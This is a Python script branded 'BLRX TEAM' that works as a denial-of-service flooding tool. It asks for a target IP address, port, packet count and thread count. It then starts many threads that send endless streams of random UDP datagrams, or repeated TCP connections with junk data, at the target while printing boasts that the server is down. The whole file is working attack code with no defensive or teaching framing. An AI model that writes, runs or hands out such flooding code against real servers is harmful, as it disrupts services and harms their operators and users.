import random
import socket
import threading
import platform

print("DDoS is Running in : "+platform.system())

if platform.system() == 'Windows':

	print("""
 BLRX TEAM is Presenting to you :


██████╗░██╗░░░░░██████╗░██╗░░██╗
██╔══██╗██║░░░░░██╔══██╗╚██╗██╔╝
██████╦╝██║░░░░░██████╔╝░╚███╔╝░
██╔══██╗██║░░░░░██╔══██╗░██╔██╗░
██████╦╝███████╗██║░░██║██╔╝╚██╗
╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
████████╗███████╗░█████╗░███╗░░░███╗
╚══██╔══╝██╔════╝██╔══██╗████╗░████║
░░░██║░░░█████╗░░███████║██╔████╔██║
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝


Created by BLRX丶SAMORAY

	""")
else :
	print(""" \033[0;32m
 BLRX TEAM is Presenting to you :

██████╗░██╗░░░░░██████╗░██╗░░██╗
██╔══██╗██║░░░░░██╔══██╗╚██╗██╔╝
██████╦╝██║░░░░░██████╔╝░╚███╔╝░
██╔══██╗██║░░░░░██╔══██╗░██╔██╗░
██████╦╝███████╗██║░░██║██╔╝╚██╗
╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
████████╗███████╗░█████╗░███╗░░░███╗
╚══██╔══╝██╔════╝██╔══██╗████╗░████║
░░░██║░░░█████╗░░███████║██╔████╔██║
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
		""")


print("\033[0;31m DDoS Created By SaMoRaY")
ip= str(input("                    Server ip :"))
port= int(input("                Port :"))
choice = str(input("          Need Attack This ip?? (y/n) :"))
times= int(input("             Paket :"))
threads= int(input("         Threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[0;33m BLRX TEAM TA9TA7EM !!!")
		except:
			print("[!] \033[0;32m SERVER DOWN BY BLRX TEAM !!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[0;34m BLRX TEAM TA9TA7EM !!!")
		except:
			s.close()
			print("[*] \033[0;35m SERVER DOWNBY BLRX TEAM !!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()